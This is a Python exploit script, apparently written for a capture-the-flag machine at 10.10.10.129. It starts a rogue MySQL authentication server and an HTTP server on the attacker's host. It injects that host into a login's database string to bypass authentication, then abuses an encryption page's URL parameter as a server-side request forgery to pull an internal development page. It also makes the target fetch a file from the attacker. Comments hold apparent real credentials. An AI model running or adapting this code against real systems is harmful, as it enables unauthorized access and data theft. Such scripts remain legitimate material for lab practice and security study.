#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
import time

import requests
import subprocess
import os
from bs4 import BeautifulSoup
import threading
import base64
import sys
import pprint

try:
    ATTACKER_HOST = sys.argv[1]
    ATTACK_DBSTR = "cryptor; host=" + ATTACKER_HOST
except IndexError:
    print("Usage: " + sys.argv[0] + " <YOUR IP ADDR>")
    sys.exit(1)


def callfakeserv():
    if os.getuid() != 0:
        print("This script need ROOT privilegegs to open a http server listens on 80.")
        sys.exit(2)
    subprocess.Popen(["python3", "MySQL-Auth-Server/MySQL-Auth-Server.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    subprocess.Popen(["python3", "onekeyhttpserver.py", "80"],stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def interact():
    session = requests.session()
    baseurl_index = "http://10.10.10.129"

    def parse_to_get(params, elem_type, elem_attr, isPredefined):
        htmlsrc = BeautifulSoup(params, "lxml")
        if isPredefined:
            return htmlsrc.find(elem_type, elem_attr).get("value")
        else:
            return htmlsrc.find(elem_type, elem_attr).text

    def write_data_to_fd(name, mode, content):
        with open(name, mode) as fd:
            fd.write(content)

    def build_payload(params, iptdata):
        baseurl = "http://10.10.10.129/encrypt.php?cipher=RC4&url="
        query = baseurl + params
        req = session.post(query, data=iptdata)
        return parse_to_get(req.content, "textarea", {"name": "textarea"}, False)

    req = session.get(baseurl_index)
    token = parse_to_get(req.content, "input", {"name": "token"}, True)
    data = {
        # "username": "dbuser",
        # "password": "krypt0n1te",
        "username": "fuckyou",
        "password": "sonofabitch",
        "db": ATTACK_DBSTR,
        "token": "{}".format(token),
        "login": ""
    }

    getdata1 = session.post(baseurl_index, data=data)
    getdata2 = build_payload("http://127.0.0.1/dev/index.php", data)
    write_data_to_fd("firstpost", "wb", base64.b64decode(getdata2))
    usr_storage = "http://" + ATTACKER_HOST + "/firstpost"
    getdata3 = build_payload(usr_storage, data)
    write_data_to_fd("secondsend.html", "wb", base64.b64decode(getdata3))
    with open("secondsend.html", "r") as fd2:
        pprint.pprint(fd2.read())


def main():
    if os.path.isdir("MySQL-Auth-Server") and os.path.isfile("onekeyhttpserver.py"):
        operation1 = threading.Thread(target=callfakeserv()).start()
        time.sleep(2)
        operation2 = threading.Thread(target=interact()).start()
    else:
        print("Dependencies not exist, please clone the whole repo.")
        sys.exit(1)


if __name__ == '__main__':
    main()
